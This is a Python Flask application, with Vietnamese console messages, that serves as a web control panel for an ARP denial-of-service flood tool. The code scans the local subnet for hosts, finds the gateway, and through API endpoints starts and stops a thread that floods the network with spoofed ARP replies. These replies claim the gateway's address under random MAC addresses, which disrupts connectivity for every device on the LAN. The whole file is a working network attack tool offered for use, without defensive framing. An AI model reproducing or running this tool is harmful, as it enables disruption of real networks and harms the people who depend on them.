#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, render_template, jsonify, request, send_from_directory
from scapy.all import ARP, Ether, sendp, srp, RandMAC, conf
import time
import sys
import os
import threading
from datetime import datetime
import ipaddress
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'

# Global variables
flood_active = False
flood_thread = None
scan_results = []
gateway_ip = ""
sent_packets = 0

def is_admin():
    if os.name == 'nt':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        try:
            return os.geteuid() == 0
        except:
            return False

def get_local_subnet():
    try:
        gw = conf.route.route("0.0.0.0")[2]
        for route in conf.route.routes:
            if route[2] == gw and route[3] != 'lo' and route[3] != '':
                net = ipaddress.ip_network(f"{route[1]}/{route[0]}", strict=False)
                return str(net)
        return "192.168.1.0/24" 
    except:
        return "192.168.1.0/24"

def arp_scan(subnet):
    global scan_results
    print(f"[+] Đang quét mạng: {subnet}")
    
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, _ = srp(arp_request_broadcast, timeout=5, verbose=False)
    
    clients = []
    for sent, received in answered:
        clients.append({
            "ip": received.psrc,
            "mac": received.hwsrc
        })
    
    scan_results = sorted(clients, key=lambda x: x["ip"])
    return clients

def get_gateway_ip():
    try:
        return conf.route.route("0.0.0.0")[2]
    except:
        return "192.168.1.1"

def arp_dos_broadcast_flood(gateway_ip, interval=0.02):
    global flood_active, sent_packets
    sent = 0
    try:
        while flood_active:
            fake_mac = str(RandMAC()) 
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp = ARP(op=2,
                      psrc=gateway_ip,
                      pdst="255.255.255.255",
                      hwsrc=fake_mac)
            sendp(ether / arp, verbose=False)
            sent += 1
            sent_packets = sent
            if sent % 100 == 0:
                print(f"\r[+] Đã gửi {sent:,} gói ARP flood broadcast", end="")
            time.sleep(interval)
    except Exception as e:
        print(f"\n[-] Lỗi: {e}")
    finally:
        flood_active = False
        print(f"\n[+] Tổng gói đã gửi: {sent:,}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['GET'])
def scan_network():
    global gateway_ip
    try:
        subnet = get_local_subnet()
        gateway_ip = get_gateway_ip()
        
        # Run scan
        clients = arp_scan(subnet)
        
        return jsonify({
            'status': 'success',
            'subnet': subnet,
            'gateway': gateway_ip,
            'clients': clients,
            'count': len(clients)
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/flood/start', methods=['POST'])
def start_flood():
    global flood_active, flood_thread, gateway_ip, sent_packets
    
    if flood_active:
        return jsonify({'status': 'error', 'message': 'Flood already active'})
    
    try:
        data = request.get_json()
        interval = float(data.get('interval', 0.015))
    except:
        interval = 0.015
    
    sent_packets = 0
    flood_active = True
    flood_thread = threading.Thread(
        target=arp_dos_broadcast_flood,
        args=(gateway_ip, interval)
    )
    flood_thread.daemon = True
    flood_thread.start()
    
    return jsonify({'status': 'success', 'message': 'Flood started'})

@app.route('/api/flood/stop', methods=['POST'])
def stop_flood():
    global flood_active
    flood_active = False
    return jsonify({'status': 'success', 'message': 'Flood stopped'})

@app.route('/api/flood/status', methods=['GET'])
def flood_status():
    global flood_active, sent_packets
    return jsonify({
        'active': flood_active,
        'packets': sent_packets
    })

if __name__ == "__main__":
    if not is_admin():
        print("=" * 60)
        print("[-] CẦN CHẠY VỚI QUYỀN ADMINISTRATOR!")
        print("[-] Right-click → Run as administrator")
        print("=" * 60)
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    print("=" * 60)
    print("  ARP DoS Flood Tool - Web Interface")
    print("=" * 60)
    print("[+] Đang khởi động server...")
    print("[+] Truy cập: http://localhost:5000")
    print("[+] Nhấn Ctrl+C để dừng server")
    print("=" * 60)
    
    # Tạo thư mục templates nếu chưa có
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    app.run(debug=False, host='0.0.0.0', port=5000)
